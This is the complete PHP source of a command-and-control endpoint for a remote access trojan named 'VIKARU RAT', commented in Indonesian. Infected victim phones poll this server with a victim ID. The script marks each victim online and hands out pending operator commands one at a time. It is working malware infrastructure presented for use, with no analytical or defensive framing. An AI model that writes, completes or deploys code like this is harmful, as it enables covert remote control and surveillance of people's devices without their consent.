<?php
/**
 * VIKARU RAT - Check Command Endpoint
 * Method: GET (APK korban mengecek apakah ada perintah baru)
 * Parameter: victim_id
 */

require_once __DIR__ . '/../config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['error' => 'method_not_allowed']);
    exit;
}

$victimId = sanitize($conn, $_GET['victim_id'] ?? '');

if (empty($victimId)) {
    http_response_code(400);
    echo json_encode(['error' => 'missing_victim_id']);
    exit;
}

// Update status victim menjadi online
mysqli_query($conn, "UPDATE victims SET status='online', last_online=NOW() WHERE id='$victimId'");

// Cari perintah pending
$sql = "SELECT id, command, parameter 
        FROM commands 
        WHERE victim_id='$victimId' AND status='pending' 
        ORDER BY id ASC 
        LIMIT 1";

$result = mysqli_query($conn, $sql);

if ($result && mysqli_num_rows($result) > 0) {
    $row = mysqli_fetch_assoc($result);

    // Update status menjadi 'sent' (sudah dikirim ke APK)
    mysqli_query($conn, "UPDATE commands SET status='sent' WHERE id={$row['id']}");

    echo json_encode([
        'status'    => 'command_available',
        'command'   => $row['command'],
        'parameter' => $row['parameter']
    ]);
} else {
    echo json_encode([
        'status'  => 'idle',
        'command' => null
    ]);
}
?>
